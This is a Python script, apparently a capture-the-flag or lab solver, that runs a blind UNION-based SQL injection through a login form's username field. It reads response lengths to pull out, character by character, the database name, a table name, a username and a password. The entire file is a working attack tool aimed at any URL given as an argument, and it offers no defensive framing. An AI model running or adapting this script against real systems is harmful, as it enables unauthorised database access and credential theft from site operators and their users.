
import requests
import signal
import sys
from pwn import *
import argparse

def signal_handler(signal, frame):
    log.info("[+] Exit...")
    sys.exit(0)

def make_query(state, db_name, table_name, user_name, password, leter):
    if state == 1:
        return "' UNION SELECT 1,2,3,4 WHERE database() LIKE '%s%s%%';-- -" % (db_name, leter)
    elif state == 2:
        return "' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = '%s' AND table_name LIKE '%s%%';-- -" % (db_name, table_name+leter)
    elif state == 3:
        return "' UNION SELECT 1,2,3,4 FROM %s WHERE username LIKE '%s%%';-- -" % (table_name, user_name+leter)
    elif state == 4:
        return "' UNION SELECT 1,2,3,4 FROM %s WHERE username = '%s' AND password LIKE BINARY '%s%%';-- -" % (table_name, user_name, password+leter)

def make_request(url, query):
    data = {'username': query, 'password': '123456'}
    return requests.post(url, data=data, allow_redirects=True)

def main(url):
    signal.signal(signal.SIGINT, signal_handler)

    probe = '+-{}(), abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
    db_name = ''
    table_name = ''
    user_name = ''
    password = ''
    state = 1

    while state < 5:
        for leter in probe:
            query = make_query(state, db_name, table_name, user_name, password, leter)
            response = make_request(url, query)

            if len(response.content) == 618:
                if state == 1:
                    db_name += leter
                elif state == 2:
                    table_name += leter    
                elif state == 3:
                    user_name += leter
                elif state == 4:
                    password += leter
                break

            if leter == probe[-1]:
                if state == 1:
                    log.success("Database: %s" % db_name)
                elif state == 2:
                    log.success("Table: %s" % table_name)
                elif state == 3:
                    log.success("User: %s" % user_name)
                elif state == 4:
                    log.success("Password: %s" % password)
                state += 1

            if leter != "\n":
                if state == 1:
                    print("Database: %s%s" % (db_name, leter), end='\r')
                elif state == 2:
                    print("Table: %s%s" % (table_name, leter), end='\r')
                elif state == 3:
                    print("User: %s%s" % (user_name, leter), end='\r')
                elif state == 4:
                    print("Password: %s%s" % (password, leter), end='\r')

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SQL Injection Script')
    parser.add_argument('-u','--url', type=str, help='URL to target', required=True)
    args = parser.parse_args()
    main(args.url)
